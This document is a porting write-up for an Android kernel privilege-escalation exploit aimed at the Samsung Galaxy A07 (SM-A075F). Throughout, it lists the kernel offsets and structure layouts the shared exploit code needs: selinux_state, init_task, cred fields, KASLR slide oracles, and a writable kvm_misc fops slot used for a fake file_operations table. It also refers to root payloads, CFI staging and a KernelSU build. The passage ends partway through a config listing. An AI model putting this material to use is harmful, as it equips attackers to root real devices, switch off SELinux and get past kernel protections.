# SM-A075F — A075FXXS5BZD2

Samsung Galaxy A07 (SM-A075F), firmware `A075FXXS5BZD2`, kernel
`6.12.23-android16-5-abA075FXXS5BZD2-4k`.

```text
model:            SM-A075F
device:           a075fxx
firmware:         A075FXXS5BZD2
kernel:           6.12.23-android16-5-abA075FXXS5BZD2-4k
vermagic:         6.12.23-android16-5-abA075FXXS5BZD2-4k SMP preempt mod_unload modversions aarch64
bootloader:       Samsung little-kernel (MediaTek MT6789 / Helio G99 platform code)
page size:        4096
kernel Image:     0x2700100 bytes, .kernel 0x000000-0x26eba00, .bss 0x26eba00-0x27eba00
KIMAGE_TEXT_BASE: 0xffffffc080000000
```

Target directory: `src/targets/a07-A075FXXS5BZD2/`.

## 1. Firmware identity

The `A075FXXS5BZD2` firmware assets were staged into `build/a075f-fw/` by the
`a075f-fetch-assets` workflow. The kernel Image was taken from `boot.img` and
verified to be `0x2700100` bytes.

The Linux banner inside the Image reads:

```text
Linux version 6.12.23-android16-5-abA075FXXS5BZD2-4k (kleaf@build-host)
(Android (12833971, +pgo, +bolt, +lto, +mlgo, based on r536225) clang version
19.0.1, LLD 19.0.1) #1 SMP PREEMPT Mon Apr  6 10:37:19 UTC 2026
```

The ARM64 Image header carries `text_offset = 0x0`, `image_size = 0x28a0000` and
`flags = 0xa`, i.e. a relocatable/KASLR Image.

## 2. Symbols, BTF and section bounds

`vmlinux-to-elf --no-deps` recovered `vmlinux.elf` (135140 symbols) from the raw
Image; `vmlinux.nm` is the numeric-sorted symbol list. The standalone BTF blob was
located at Image offset `0x1990120` (magic `0xeb9f`, version 1, header length 24,
`type_off`/`str_off` validated, string section starts with NUL) and is
`0x6a0e59` bytes long. It parses cleanly and contains 165681 types.

Section bounds recovered from the symbol table (image offsets):

| Section | Start | End |
| --- | ---: | ---: |
| `.text` | `0x000000` (`_text`) / `0x010000` (`_stext`) | `0x1200000` (`_etext`) |
| `.rodata` | `0x1200000` (`__start_rodata`) | `0x2035000` (`__end_rodata`) |
| `.init` | `0x2050000` (`__init_begin`) | `0x24b0000` |
| `.data` | `0x24b0000` (`_sdata`) | `0x26eba00` (`_edata`) |
| `.bss` | `0x26ec000` (`__bss_start`) | `0x27ec000` |

Every `.data` offset below was confirmed to lie inside `0x24b0000..0x26eba00`
(writable) and every text offset inside `0x010000..0x1200000`.

## 3. Symbol offsets

All values are offsets from `KIMAGE_TEXT_BASE`.

| Macro | Symbol | Offset |
| --- | --- | ---: |
| `CALL_USERMODEHELPER_EXEC_WORK_OFF` | `call_usermodehelper_exec_work` | `0x000f758c` |
| `NOOP_LLSEEK_OFF` | `noop_llseek` | `0x0043a610` |
| `COPY_SPLICE_READ_OFF` | `copy_splice_read` | `0x0048d0ac` |
| `CONFIGFS_READ_ITER_OFF` | `configfs_read_iter` | `0x00510c04` |
| `CONFIGFS_BIN_WRITE_ITER_OFF` | `configfs_bin_write_iter` | `0x005111b0` |
| `ANON_PIPE_BUF_OPS_OFF` | `anon_pipe_buf_ops` | `0x0124ee88` |
| `SLIDE_NFULNL_LOGGER_NAME_OFF` | `"nfnetlink_log"` string, target of `nfulnl_logger.name` | `0x017e8698` |
| `KMALLOC_CACHES_OFF` | `kmalloc_caches` | `0x0186b4c0` |
| `SYSTEM_UNBOUND_WQ_OFF` | `system_unbound_wq` | `0x0186b250` |
| `INIT_TASK_OFF` | `init_task` | `0x024ccf00` |
| `SLIDE_NFULNL_LOGGER_OBJECT_OFF` | `nfulnl_logger` | `0x024c2198` |
| `SLIDE_RANDOM_TABLE_BOOT_ID_DATA_PTR_OFF` | `random_table[4].data` | `0x025eafd8` |
| `ROOT_TASK_GROUP_OFF` | `root_task_group` | `0x026fdd80` |
| `SELINUX_ENFORCING_OFF` | `selinux_state` (`enforcing` at +0) | `0x0274a820` |
| `SYSCTL_BOOTID_OFF` | `sysctl_bootid` | `0x027ec630` |

### 3.1 netfilter logger and boot-id slots

`nfulnl_logger` is `struct nf_logger` at `0x024c2198`:

```text
+0x00  name    = 0xffffffc0817e8698  ->  "nfnetlink_log"
+0x08  type    = 1
+0x10  logfn   = 0xffffffc080fb638c  ->  nfulnl_log_packet
```

`random_table` is at `0x025eaef0`; walking it with the BTF-verified
`struct ctl_table` (sizeof `0x38`) gives:

```text
[0] poolsize              data=0xffffffc0825eaee0
[1] entropy_avail         data=0xffffffc0825ead9c
[2] write_wakeup_threshold data=0xffffffc0825eaee4
[3] urandom_min_reseed_secs data=0xffffffc0825eaee8
[4] boot_id               data=0xffffffc0827ec630   <-- == sysctl_bootid
```

The `boot_id` entry starts at `0x025eafd0`, so its `.data` pointer field is at
`0x025eafd8`. The read-back `0xffffffc0827ec630` equals the `sysctl_bootid`
symbol, which confirms both offsets.

## 4. Physical load addresses

`P0_PHYS_OFFSET = 0x40000000` and `P0_KERNEL_PHYS_LOAD = 0x48400000` come from
the MT6789 platform identification in `lk-verified.img`
(`platform/mediatek/mt6789/...`, `MT6789V/TCD`, `mediatek,mt6789-mmc`) and the
kernel-load immediates in the same image: the `movz xN, #0x4840, lsl #16`
encodings of `0x48400000` occur nine times, which is the MTK kernel load slot for
a `0x40000000` DRAM base. `P0_PHYS_OFFSET` is the DRAM base and
`P0_KERNEL_PHYS_LOAD` is the physical address of Image offset 0.

`P0_PAGE_OFFSET = 0xffffff8000000000` is the arm64 linear-map base for
`CONFIG_ARM64_VA_BITS_39=y` with `CONFIG_ARM64_4K_PAGES=y`; the direct map is
`0xffffff8000000000..0xffffff9000000000` and `VMEMMAP_START` is
`0xfffffffe00000000`.

Both physical values are offline derivations. They must be confirmed on-device
before the physical-P0 oracle routes are trusted; the tracefs slide route does
not depend on them.

### 4.1 `P0_KERNEL_PHYS_LOAD` — status and the on-device proof

`P0_PHYS_OFFSET = 0x40000000` is **confirmed** from on-device `/proc/zoneinfo`
(DMA32 `start_pfn 262144`, Normal `start_pfn 1048576`; RAM spans
`0x40000000`–`0x140000000`, 4 GiB total).

`P0_KERNEL_PHYS_LOAD = 0x48400000` is **still unproven**. What the LK image
actually contains, and what it does not:

**Present.** `build/a075f-fw/lk-verified.img` holds nine
`movz xN, #0x4840, lsl #16` sites (LK file offsets, LK is linked with
VA == file offset — `adrp`/`add` string references resolve exactly):

```text
0x00a70dc  0x00a71f0  0x00ddf8c  0x023a564  0x023a678
0x024a78c  0x0347238  0x034734c  0x0357edc
```

Every one of them is immediately followed by `movk xN, #0xffff, lsl #48`,
i.e. the value used is the LK virtual address
`0xffff48400000 == KERNEL_ASPACE_BASE(0xffff000000000000) + 0x48400000` — the
standard LK "map this physical page into the kernel address space" idiom, not a
bare integer. For example at `0x00a70dc`:

```asm
0x00a70dc:  mov   x19, #0x48400000
0x00a70e8:  movk  x19, #0xffff, lsl #48      ; x19 = 0xffff48400000
0x00a70f0:  stur  x19, [x29, #-8]
...
0x00a7110:  mov   w3, #0x48400000            ; physical argument
0x00a7144:  mov   w5, #0x48400000            ; physical argument
```

That site is in the AVB kernel-cmdline path — the same function loads the
`: Kernel cmdline descriptor is invalid.\n` literal from
`external/lib/libavb/avb_kernel_cmdline_descriptor.c` (string at LK file offset
`0x16c2a5`).

**Absent.** Nothing in the LK image proves that `0x48400000` is *the kernel
Image's* load address. On the contrary, LK contains the literal

```text
LK file offset 0x145de5:  "kernel_addr (0x%p) is not taken from mb (0x%llx)\n"
```

which is the `app/mt_boot/mt_boot.c` path that normally takes `kernel_addr`
from an MTK **mblock** reservation — i.e. from the device-tree-derived reserved
memory — and only falls back to a static value when the mblock entry is
missing. So `0x48400000` is a *static default*, and the runtime value is
whatever the DTB's mblock reserve says.

The kernel Image itself cannot settle it either: `kimage_voffset` (Image offset
`0x1864000`) and `memstart_addr` (`0x18637d8`) are `0` and `-1` in the Image,
and `reserved_pg_dir` / `swapper_pg_dir` are all zero — the kernel is
`CONFIG_RELOCATABLE`, so all of those are filled in at boot.

**To settle it on-device**, dump:

```sh
cat /proc/iomem | head -40
```

The `Kernel code` / `Kernel data` / `Kernel bss` rows give the physical ranges of
the running kernel image. `P0_KERNEL_PHYS_LOAD` is then
`(<start of the "Kernel code" row>) - 0x10000`, because `_stext` sits at Image
offset `0x10000` (`KIMAGE_TEXT_BASE + 0x10000 = 0xffffffc080010000`).

Cross-check with `dmesg | head -40` (the `Memory:` / `Kernel command line:`
lines) and, if LK's log is reachable, with LK's own
`kernel_addr (0x...) is not taken from mb (0x...)` line, which prints the mblock
value it actually used.

## 5. Slide data

### 5.1 Trace event ID

`SLIDE_TRACEFS_EVENT_ID = 110`.

6.12 no longer keeps the old `next_event_type` counter in
`kernel/trace/trace_events.c`. Event ids are now allocated by an IDA in
`kernel/trace/trace_output.c`:

```c
static int alloc_trace_event_type(void)
{
        int next;

        /* Skip static defined type numbers */
        next = ida_alloc_range(&trace_event_ida, __TRACE_LAST_TYPE,
                               TRACE_EVENT_TYPE_MAX, GFP_KERNEL);
        if (next < 0)
                return 0;
        return next;
}
```

so every dynamically registered event gets `id = __TRACE_LAST_TYPE + N`, where
`N` is its zero-based index in `__start_ftrace_events..__stop_ftrace_events`.

`__TRACE_LAST_TYPE = 20`, **not** 19. `enum trace_type` in
`kernel/trace/trace.h` spends the explicit value `0` on `__TRACE_FIRST_TYPE`,
so the 19 named enumerators after it (`TRACE_FN` … `TRACE_FUNC_REPEATS`)
occupy 1…19 and `__TRACE_LAST_TYPE` lands on 20:

```c
enum trace_type {
        __TRACE_FIRST_TYPE = 0,   /* takes 0 */
        TRACE_FN,                 /* 1  */
        ...
        TRACE_FUNC_REPEATS,       /* 19 */
        __TRACE_LAST_TYPE,        /* 20 */
};
```

From the recovered symbols (image offsets, vaddr = offset + `KIMAGE_TEXT_BASE`):

```text
__start_ftrace_events            = 0xffffffc08246c5a8  -> 0x246c5a8
__event_sched_waking             = 0xffffffc08246c7f8  -> 0x246c7f8  index 74
__event_sched_blocked_reason     = 0xffffffc08246c878  -> 0x246c878  index 90

event_id = __TRACE_LAST_TYPE + event_index = 20 + 90 = 110
```

The base is confirmed twice over, independently of the enum arithmetic: the
device reports `sched_waking/id = 94` and `sched_blocked_reason/id = 110`, and
`110 - 94 == 16 == 90 - 74`. Both events therefore imply the same base of 20,
which means the zero-based indices recovered from `__start_ftrace_events` are
correct and only the base constant was wrong. **Runtime values win**: the
device-reported `110` is authoritative, and the earlier `109` was an
off-by-one in the enum count (the enumerator values start at 1, not 0, because
`__TRACE_FIRST_TYPE` explicitly claims 0).

### 5.2 Worker caller

`SLIDE_TRACEFS_WORKER_CALLER_OFF = 0x00101ef8`.

`worker_thread` is at `0xffffffc080101e4c`. Its only blocking call is

```text
0xffffffc080101ef4:  bl schedule          ; schedule = 0xffffffc0811c4fbc
```

so the saved return PC is `0xffffffc080101ef8`, i.e. image offset `0x00101ef8`
(`worker_thread+0xac`). For an idle kworker blocked in `worker_thread`,
`get_wchan()` skips `__schedule` and `schedule` and returns exactly this PC.

### 5.3 vfork caller — not used

`SLIDE_TRACEFS_VFORK_CALLER_OFF` is deliberately **not** defined for this target.
On `android16-6.12` the vfork parent blocks through
`wait_for_vfork_done() -> wait_for_completion_killable()`, and in this build
`wait_for_completion_killable` (`0xffffffc0811c5998`) is a real outlined function
that reaches the scheduler through `wait_for_common` / `wait_for_common_io`
(`0xffffffc0811c10b8`, `0xffffffc0811c5270`); there is no direct `bl schedule`
inside `wait_for_vfork_done`, `kernel_clone` or `copy_process`. The returned
wchan PC is therefore not a single stable named call site, so the optional
vfork caller list is left empty and the worker caller alone resolves the slide.
The macro is `#ifdef`-guarded in the shared exploit code, so omitting it is
supported.

### 5.4 pselect word shift

`SLIDE_PSELECT_WORD_SHIFT = 2` (revised 2026-10-03; was 0 in the first
draft of this profile).

Two independent, device-verified ports of the same GKI kernel base
(`6.12.x-android16-5`, MediaTek MT6789) both use a shift of 2:

- ghostlock-a17, SM-A175F, `6.12.23-android16-5-abA175FXXS3BZA5-4k`
  (same kernel base as this firmware; device-verified):
  `SLIDE_PSELECT_WORD_SHIFT 2` in both its 6.12.23 and 6.12.38 headers.
- ghostlock-emerald, POCO M6 Pro (MT6789),
  `6.12.30-android16-5-g6e872b4863d6-ab13847919-4k` (device-verified):
  `SLIDE_PSELECT_WORD_SHIFT 2`.

The 5.10/6.1/6.6 targets in this repository all use 0; the value is
kernel-generation specific, not a portable default. `do_pselect`
(`fs/select.c`) is unmodified GKI code between these builds, and the shift
was additionally re-checked against the `do_pselect` disassembly of the
exact A075F Image by the CI derivation step. With shift 2, waiter qword
zero overlaps the third logical fd-set qword (read set qword 2).

### 5.5 P0 fingerprint

`p0_fingerprint.h` was generated with
`tools/generate_p0_fingerprint.pl kernel.raw 0x1f0000 p0_fingerprint.h`, which
reports `verified 32 rows and 256 source qwords at probe 0x1f0000`. Each row maps
a candidate slide to `Image[0x1f0000 - slide]`, sampling qwords at page offsets
`0x000, 0x200, 0x400, 0x600, 0x800, 0xa00, 0xc00, 0xe00`.

## 6. BTF-derived structure layouts

All sizes and member offsets come from the target BTF
(`build/a075f/vmlinux.btf`), never from another device.

```text
sizeof(struct file_operations) = 0x108
  owner 0x00  fop_flags 0x08  llseek 0x10  read 0x18  write 0x20
  read_iter 0x28  write_iter 0x30  iopoll 0x38  iterate_shared 0x40
  poll 0x48  unlocked_ioctl 0x50  compat_ioctl 0x58  mmap 0x60  open 0x68
  flush 0x70  release 0x78  fsync 0x80  fasync 0x88  lock 0x90
  get_unmapped_area 0x98  check_flags 0xa0  flock 0xa8  splice_write 0xb0
  splice_read 0xb8  splice_eof 0xc0  setlease 0xc8  fallocate 0xd0
  show_fdinfo 0xd8  copy_file_range 0xe0  remap_file_range 0xe8
  fadvise 0xf0  uring_cmd 0xf8  uring_cmd_iopoll 0x100

sizeof(struct task_struct) = 0x1440
  usage 0x40  prio 0x94  static_prio 0x98  normal_prio 0x9c
  sched_class 0x418  sched_task_group 0x420  policy 0x548
  nr_cpus_allowed 0x558  cpus_ptr 0x560  migration_disabled 0x580
  tasks 0x638  mm 0x688  active_mm 0x690  ptracer_cred 0x8f0
  real_cred 0x8f8  cred 0x900  comm 0x910  fs 0x938  files 0x940
  pi_lock 0x9ec  pi_waiters 0xa00  pi_top_task 0xa10
  pi_blocked_on 0xa18  thread 0xda0

sizeof(struct cred) = 0xb8
  usage 0x00  uid 0x08  gid 0x0c  suid 0x10  sgid 0x14  euid 0x18
  egid 0x1c  fsuid 0x20  fsgid 0x24  securebits 0x28
  cap_inheritable 0x30  cap_permitted 0x38  cap_effective 0x40
  cap_bset 0x48  cap_ambient 0x50  jit_keyring 0x58
  session_keyring 0x60  process_keyring 0x68  thread_keyring 0x70
  request_key_auth 0x78  security 0x80  user 0x88  user_ns 0x90
  ucounts 0x98  group_info 0xa0

sizeof(struct page) = 0x40
  flags 0x00  <anon union, compound_head> 0x08
  <4-byte page_type/_mapcount union> 0x30  _refcount 0x34  memcg_data 0x38

sizeof(struct slab) = 0x40
  __page_flags 0x00  slab_cache 0x08  <anon> 0x10  __page_type 0x30
  __page_refcount 0x34  obj_exts 0x38

sizeof(struct miscdevice) = 0x50
  minor 0x00  name 0x08  fops 0x10  list 0x18  parent 0x28
  this_device 0x30  groups 0x38  nodename 0x40  mode 0x48

sizeof(struct configfs_buffer) = 0x80
  count 0x00  pos 0x08  page 0x10  ops 0x18  mutex 0x20
  needs_read_fill 0x50  read_in_progress 0x54  write_in_progress 0x55
  bin_buffer 0x58  bin_buffer_size 0x60  cb_max_size 0x64  item 0x68  owner 0x70

sizeof(struct rt_mutex_waiter) = 0x70
  tree 0x00 (entry 0x18, prio 0x18, deadline 0x20)  pi_tree 0x28
  (entry 0x28, prio 0x40, deadline 0x48)  task 0x50  lock 0x58
  wake_state 0x60  ww_ctx 0x68

sizeof(struct work_struct) = 0x20   data 0x00 entry 0x08 func 0x18
sizeof(struct workqueue_struct) = 0x140
  pwqs 0x00  mutex 0x20  first_flusher 0x60  flusher_queue 0x68
  flusher_overflow 0x78  maydays 0x88  rescuer 0x98  dfl_pwq 0xc0
  name 0xd0  rcu 0xf0  flags 0x100  cpu_pwq 0x108  node_nr_active 0x110
sizeof(struct pool_workqueue) = 0x200
  pool 0x00  wq 0x08  work_color 0x10  flush_color 0x14  refcnt 0x18
  nr_in_flight 0x1c  plugged 0x5c  nr_active 0x60  inactive_works 0x68
  pending_node 0x78  pwqs_node 0x88  mayday_node 0x98  release_work 0xe8
  rcu 0x110
sizeof(struct worker_pool) = 0x318
  lock 0x00  cpu 0x04  node 0x08  id 0x0c  flags 0x10  watchdog_ts 0x18
  cpu_stall 0x20  nr_running 0x24  worklist 0x28  nr_workers 0x38
  nr_idle 0x3c  idle_list 0x40  idle_timer 0x50  idle_cull_work 0x78
  mayday_timer 0x98  busy_hash 0xc0  manager 0x2c0  workers 0x2c8
  worker_ida 0x2d8  attrs 0x2e8  hash_node 0x2f0  refcnt 0x300  rcu 0x308
sizeof(struct worker) = 0xa8
  current_work 0x10  current_func 0x18  current_pwq 0x20  current_at 0x28
  current_color 0x30  sleeping 0x34  last_func 0x38  scheduled 0x40
  task 0x50  pool 0x58  node 0x60  last_active 0x70  flags 0x78  id 0x7c
  desc 0x80  rescue_wq 0xa0
sizeof(struct kmem_cache) = 0x100
  cpu_slab 0x00  flags 0x08  min_partial 0x10  size 0x18  object_size 0x1c
  offset 0x28  oo 0x34  min 0x38  refcount 0x40  ctor 0x48  inuse 0x50
  align 0x54  red_left_pad 0x58  name 0x60  list 0x68
sizeof(struct file) = 0xd8
  f_count 0x00  f_lock 0x08  f_mode 0x0c  f_op 0x10  f_mapping 0x18
  private_data 0x20  f_inode 0x28  f_flags 0x30  f_iocb_flags 0x34
  f_cred 0x38  f_path 0x40  f_pos 0x80  f_security 0x88  f_owner 0x90
  f_wb_err 0x98  f_sb_err 0x9c  f_ep 0xa0
sizeof(struct dentry) = 0xd0
  d_flags 0x00  d_seq 0x04  d_hash 0x08  d_parent 0x18  d_name 0x20
  d_inode 0x30  d_iname 0x38  d_op 0x60  d_sb 0x68  d_time 0x70
  d_fsdata 0x78  d_lockref 0x80  d_sib 0x98  d_children 0xa8  d_u 0xb0
sizeof(struct qstr) = 0x10   (hash 0x00, name 0x08)
sizeof(struct inode) = 0x2c0
  i_mode 0x00  i_opflags 0x02  i_uid 0x04  i_gid 0x08  i_flags 0x0c
  i_acl 0x10  i_default_acl 0x18  i_op 0x20  i_sb 0x28  i_mapping 0x30
  i_security 0x38  i_ino 0x40  i_rdev 0x4c  i_size 0x50  i_generation 0x7c
  i_lock 0x80  i_bytes 0x84  i_blkbits 0x86  i_write_hint 0x87
  i_blocks 0x88  i_state 0x90  i_rwsem 0x98  dirtied_when 0xd8
  i_hash 0xe8  i_lru 0x118  i_sb_list 0x128  i_count 0x168
  i_dio_count 0x16c  i_writecount 0x170  i_readcount 0x174
  i_data 0x188  i_devices 0x280  i_fsnotify_mask 0x298
  i_fsnotify_marks 0x2a0  i_crypt_info 0x2a8  i_verity_info 0x2b0
  i_private 0x2b8
sizeof(struct address_space) = 0xf8
  host 0x00  i_pages 0x08  invalidate_lock 0x18  gfp_mask 0x58
  i_mmap_writable 0x5c  nr_thps 0x60  i_mmap 0x68  nrpages 0x78
  writeback_index 0x80  a_ops 0x88  flags 0x90  wb_err 0x98
  i_private_lock 0x9c  i_private_list 0xa0  i_mmap_rwsem 0xb0
  i_private_data 0xf0
sizeof(struct vm_area_struct) = 0x100
  <anon union, vm_start> 0x00  vm_end 0x08  vm_mm 0x10  vm_page_prot 0x18
  vm_flags 0x20  anon_vma_chain 0x30  anon_vma 0x40  vm_ops 0x48
  vm_pgoff 0x50  vm_file 0x58  vm_private_data 0x60  vm_refcnt 0x80
  shared 0x88  anon_name 0xa8  vm_userfaultfd_ctx 0xb0
sizeof(struct super_block) = 0x600
  s_list 0x00  s_dev 0x10  s_blocksize_bits 0x14  s_blocksize 0x18
  s_maxbytes 0x20  s_type 0x28  s_flags 0x50  s_root 0x68  s_count 0xb0
  s_id 0x408  s_uuid 0x428  s_fs_info 0x3d8  s_inodes 0x5c8
sizeof(struct folio) = 0xc0   (struct page page; at 0x00)
sizeof(struct module) = 0x640
  state 0x00  list 0x08  name 0x18  mkobj 0x68  init 0x188  mem 0x1c0
  arch 0x3b8  taints 0x4a0  kallsyms 0x4c8  sect_attrs 0x4f0
  num_syms 0x120  exit 0x5f8  refcnt 0x600
sizeof(struct seq_file) = 0x88
  buf 0x00  size 0x08  from 0x10  count 0x18  pad_until 0x20  index 0x28
  read_pos 0x30  lock 0x38  op 0x68  poll_event 0x70  file 0x78
  private 0x80
sizeof(struct selinux_state) = 0x80   enforcing 0x00  initialized 0x01
sizeof(struct config_item) = 0x50
  ci_name 0x00  ci_namebuf 0x08  ci_kref 0x1c  ci_entry 0x20
  ci_parent 0x30  ci_group 0x38  ci_type 0x40  ci_dentry 0x48
sizeof(struct config_group) = 0x88
  cg_item 0x00  cg_children 0x50  cg_subsys 0x60  default_groups 0x68
  group_entry 0x78
sizeof(struct pipe_buffer) = 0x28
  page 0x00  offset 0x08  len 0x0c  ops 0x10  flags 0x18  private 0x20
```

`PAGE_SLAB_CACHE_OFF = 0x08` is derived from `offsetof(struct slab, slab_cache)`
in this 6.12 BTF, because 6.12 removed `page->slab_cache` and slab metadata now
lives in `struct slab`, which is embedded at the page start.

### 6.1 file_operations layout — the 6.6 vs 6.12 determination

The first draft of `target.h` carried the `a36xq-A366WVLS3AYG1` (6.6)
file_operations layout in its first half (`llseek 0x08, read 0x10, write
0x18, read_iter 0x20, write_iter 0x28, unlocked_ioctl 0x48, compat_ioctl
0x50, mmap 0x58`). That is wrong on this kernel. The section 6 BTF dump
above (machine-parsed from the target BTF) and the on-image Rust ashmem
fops table in section 7 both give the 6.12 layout:

```text
llseek 0x10  read 0x18  write 0x20  read_iter 0x28  write_iter 0x30
unlocked_ioctl 0x50  compat_ioctl 0x58  mmap 0x60
open 0x68  release 0x78  splice_read 0xb8  show_fdinfo 0xd8  (sizeof 0x108)
```

The 6.12 `file_operations` adds `iterate_shared` (0x40) and `poll` (0x48)
relative to the 6.6 struct, which is exactly the 0x08 shift seen between
the two layouts for every member from `llseek` through `mmap`. Members
from `open` (0x68) on already agreed, which is why the draft only failed
in its first half.

Cross-confirmation from two independent device-verified 6.12 ports (both
MT6789, both `6.12.x-android16-5`):

- ghostlock-a17 `src/core/target.h` / `target_czg1.h`:
  `FOPS_LLSEEK_OFF 0x10 ... FOPS_MMAP_OFF 0x60, FOPS_OPEN_OFF 0x68,
  FOPS_RELEASE_OFF 0x78, FOPS_SPLICE_READ_OFF 0xb8,
  FOPS_SHOW_FDINFO_OFF 0xd8` — byte-identical to the target BTF.
- ghostlock-emerald `src/core/target.h`: same values.

The CI derivation step re-verifies the whole table against the exact
A075F Image (BTF parse + Rust fops slot resolution) before the payload is
built, so this cannot silently regress.

### 6.2 pool_workqueue on 6.12

The section 6 dump lists `nr_active 0x60` and contains no `max_active`
member: 6.12 removed `pool_workqueue.max_active` (it now lives on
`workqueue_struct`, at `0xa4` per the ghostlock-a17 BTF audit of the same
kernel base). `PWQ_MAX_ACTIVE_OFF` therefore points at `0x60` (the
`nr_active` slot) and only feeds the `nr_active >= max_active` sanity gate
in `src/root.c`; the gate reads a large value from adjacent fields and
remains open. `PWQ_NR_ACTIVE_OFF` is `0x60`, the BTF-verified
`nr_active` offset (the 6.1/6.6 value `0x5c` is the
`plugged`/`nr_in_flight` neighborhood and is wrong here).

## 7. ashmem and the fops-pointer oracle slot

A075FXXS5BZD2 ships the **Rust** ashmem driver. Its `file_operations` is a
`static` in `.rodata` at image offset `0x13da858`
(`0xffffffc0813da858`); the members were confirmed by resolving the target
symbols that the slots contain:

| Offset | Member | Value | Symbol |
| ---: | --- | --- | --- |
| `+0x10` | `llseek` | `0xffffffc080dbfa24` | `kernel::miscdevice::fops_llseek::<ashmem_rust::Ashmem>` |
| `+0x28` | `read_iter` | `0xffffffc080dbfd40` | `kernel::miscdevice::fops_read_iter::<…>` |
| `+0x50` | `unlocked_ioctl` | `0xffffffc080dbf9d8` | `kernel::miscdevice::fops_ioctl::<…>` |
| `+0x58` | `compat_ioctl` | `0xffffffc080dbffc0` | `kernel::miscdevice::fops_compat_ioctl::<…>` |
| `+0x60` | `mmap` | `0xffffffc080dc003c` | `kernel::miscdevice::fops_mmap::<…>` |
| `+0x68` | `open` | `0xffffffc080dc0098` | `kernel::miscdevice::fops_open::<…>` |
| `+0x78` | `release` | `0xffffffc080dbfa98` | `kernel::miscdevice::fops_release::<…>` |
| `+0xd8` | `show_fdinfo` | `0xffffffc080dbff98` | `kernel::miscdevice::fops_show_fdinfo::<…>` |

That table independently confirms the whole `file_operations` layout recorded in
section 6 (`mmap 0x60`, `open 0x68`, `release 0x78`, `show_fdinfo 0xd8`,
sizeof `0x108`).

`Ashmem::ioctl` (`0xffffffc080dc1fec`) still dispatches the full classic ioctl
set, including `ASHMEM_SET_NAME = 0x41007701`
(`_IOW(0x77, 1, char[256])`), `ASHMEM_GET_NAME = 0x81007702`,
`ASHMEM_SET_SIZE = 0x40087703`, `ASHMEM_GET_SIZE = 0x00007704`,
`ASHMEM_SET_PROT_MASK = 0x40087705`, `ASHMEM_GET_PROT_MASK = 0x00007706`,
`ASHMEM_PIN = 0x40087707`, `ASHMEM_UNPIN = 0x40087708`,
`ASHMEM_GET_PIN_STATUS = 0x00007709` and `ASHMEM_PURGE_ALL_CACHES =
0x0000770a`. The `try_set_ashmem_name_blob` primitive therefore still works.

### 7.1 Why the misc-fops slot is not the ashmem one

The Rust `MiscDevice` for ashmem is created at runtime in
`ashmem_rust::AshmemModule::init`, so there is **no** static
`struct miscdevice ashmem_misc` in the Image: no `.data` qword anywhere in the
Image points at `0xffffffc0813da858`, and none of the three `"ashmem"` strings in
`.rodata` (`0x13dabf8`, `0x13dac54`, `0x13dad0c`) is referenced by a static
pointer.

The exploit needs a **writable `.data` slot whose qword is a known
`file_operations *`** (it is the read/write oracle for the fake-fops pointer and
the `slide_oracle_target`). Scanning the Image for qwords that point at a struct
matching the BTF `file_operations` signature (`owner == 0`, `fop_flags == 0`,
text `llseek`, text `unlocked_ioctl`) yields exactly 20 such slots. The only one
that is the `fops` field of a genuine `struct miscdevice` **and** whose target
`file_operations` also lives in writable `.data` is:

```text
0x024d2370  struct miscdevice kvm_misc
              minor = 0xe8 (232, MISC_DYNAMIC_MINOR)
              name  = 0xffffffc08120e428 -> "kvm"
              fops  = 0xffffffc0824d2110 -> kvm_chardev_ops
0x024d2380  kvm_misc.fops  (== 0xffffffc0824d2110)
0x024d2110  struct file_operations kvm_chardev_ops
              llseek 0x10 = noop_llseek
              unlocked_ioctl 0x50 = kvm_dev_ioctl    (0x0005f0e0)
              compat_ioctl   0x58 = kvm_no_compat_ioctl (0x0005d3ac)
              open 0x68 = kvm_no_compat_open         (0x0005d408)
```

So the port uses the self-consistent pair
`ASHMEM_MISC_OFF = 0x024d2370`, `ASHMEM_MISC_FOPS_OFF = 0x024d2380`,
`ASHMEM_FOPS_OFF = 0x024d2110`. The invariant the shared code checks
(`*(ASHMEM_MISC_FOPS) == ASHMEM_FOPS`) holds, the slot is writable `.data`, and
`try_cfi_stage()`'s restore writes back the exact original value, so no
unrelated kernel state is disturbed.

`ASHMEM_IOCTL_OFF` / `ASHMEM_COMPAT_IOCTL_OFF` / `ASHMEM_MMAP_OFF` /
`ASHMEM_OPEN_OFF` / `ASHMEM_RELEASE_OFF` / `ASHMEM_SHOW_FDINFO_OFF` are taken
from the **ashmem** driver (the `/dev/ashmem` fops in section 7), because those
values only populate the fake `file_operations` table and must be the real
ashmem entry points:

| Macro | Offset | Value |
| --- | ---: | --- |
| `ASHMEM_IOCTL_OFF` | `0x00dbf9d8` | `fops_ioctl::<Ashmem>` |
| `ASHMEM_COMPAT_IOCTL_OFF` | `0x00dbffc0` | `fops_compat_ioctl::<Ashmem>` |
| `ASHMEM_MMAP_OFF` | `0x00dc003c` | `fops_mmap::<Ashmem>` |
| `ASHMEM_OPEN_OFF` | `0x00dc0098` | `fops_open::<Ashmem>` |
| `ASHMEM_RELEASE_OFF` | `0x00dbfa98` | `fops_release::<Ashmem>` |
| `ASHMEM_SHOW_FDINFO_OFF` | `0x00dbff98` | `fops_show_fdinfo::<Ashmem>` |

## 8. Build verification

`src/targets/a07-A075FXXS5BZD2/target.h` and `p0_fingerprint.h` were compiled
against the shared exploit sources in both the `APP_PAYLOAD=1` (app payload) and
plain (root-umh) configurations, with `-Wall -Wextra`, and produce exactly the
same diagnostic set as the reference `a36xq-A366WVLS3AYG1` target — i.e. no new
errors or warnings. Configurations exercised: default,
`APP_PHYS_P0_ORACLE=1 APP_PHYS_VIRTUAL_BASE_ORACLE=1`,
`APP_S928_STABLE_RACE=1`, `SLIDE_STACK_WRITER=1`.

The Android NDK is not available in the offline porting environment, so the
`make TARGET=a07-A075FXXS5BZD2 release` binary and the KernelSU `.ko`/`ksud`
artifacts are produced by CI. See `.github/workflows/a075f-kernelsu-build.yml`
and §10.

### 8.1 Recovered kernel configuration

`src/targets/a07-A075FXXS5BZD2/kernel.config` is the **exact** `.config` of the
target kernel, extracted from the `IKCONFIG` blob embedded in the Image itself
(`CONFIG_IKCONFIG_PROC=y`, so `/proc/config.gz` on the device returns the same
bytes). The blob sits at Image offsets `0x1228760` (`IKCFG_ST`) …
`0x12341b7` (`IKCFG_ED`) and gzip-decompresses to 221,164 characters / 8090
lines / 2326 enabled symbols.

Facts from it that matter for the KernelSU build:

```text
CONFIG_MODULES=y                 CONFIG_MODVERSIONS=y
CONFIG_MODULE_SIG=y              CONFIG_MODULE_SIG_ALL=y
# CONFIG_MODULE_SIG_FORCE is not set      <- unsigned modules can be insmod'ed
